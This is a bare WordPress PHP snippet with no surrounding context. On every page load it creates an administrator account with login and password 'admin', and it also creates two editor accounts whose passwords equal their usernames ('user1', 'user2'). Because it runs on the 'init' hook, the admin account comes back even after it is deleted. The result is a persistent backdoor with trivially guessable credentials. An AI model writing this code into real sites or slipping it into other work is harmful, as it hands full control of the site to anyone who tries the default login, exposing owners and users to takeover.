function add_admin_acct(){

	$login = 'admin';
	$passw = 'admin';
	$email = '';
	if ( !username_exists( $login ) && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}
function add_editor_acct($login, $passw){

	$email = '';
	if ( !username_exists( $login ) && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'editor' );
	}
}
add_action('init','add_admin_acct');
add_action('add_editor','add_editor_acct', 10, 2);
do_action('add_editor', 'user1', 'user1');
do_action('add_editor', 'user2', 'user2');
